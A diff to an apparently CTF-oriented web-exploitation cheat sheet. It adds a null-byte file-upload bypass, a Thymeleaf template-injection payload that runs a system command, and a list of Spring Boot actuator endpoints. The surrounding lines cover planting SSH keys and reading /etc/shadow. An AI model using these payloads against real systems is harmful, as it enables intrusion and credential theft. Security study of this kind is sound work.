@@ -111,6 +111,9 @@ ex:
 ```
 If we can upload and choose the file name:
 - Add our public key to a user’s authorized_keys file (/root/.ssh/authorized_keys)
+- If a certain extension is required, try adding a null byte (%00) at the end of the file name to bypass the extension check
+  - ex: shell.php%00.jpg
+
 ### Interesting files to read:
 - /etc/passwd
 - /etc/shadow
@@ -146,7 +149,8 @@ If we need to do a POST request without js, we can add a form with the method se
 ### Different Angular XSS payloads
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
 
-## Serverside Template Injection:
+## Serverside Template Injection (SSTI):
+### jinja
 If we can a template from user input, we can inject code in the template
 Python example:
 ```python
@@ -162,6 +166,10 @@ Payloads:
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
   - Useful to check if there is a filter on characters
 
+### Thymeleaf
+```html
+<img th:src="@{${T(java.lang.Runtime).getRuntime().exec('cat /flag.txt')}}"></img>
+```
 
 
 ## JWT
@@ -280,6 +288,21 @@ https://book.hacktricks.xyz/pentesting-web/file-upload
     - We can use exiftool to add PHP code in the exif metadata
       - exiftool -Comment='<?php phpinfo(); ?>' image.jpg
 
+
+## Springboot
+- We can check if actuator endpoints are enabled
+  - /actuator
+  - /actuator/health
+  - /actuator/env
+  - /actuator/metrics
+  - /actuator/loggers
+  - /actuator/threaddump
+  - /actuator/httptrace
+  - /actuator/mappings
+  - /actuator/configprops
+  - /actuator/auditevents
+  - /actuator/beans
+- They can give useful information about the server and sometimes allow RCE
 
 ## Other
 - To dump the content of a directory from a website: `wget -r -np -nH --cut-dirs=3 -R index.html http://hostname/aaa/bbb/ccc/ddd/`
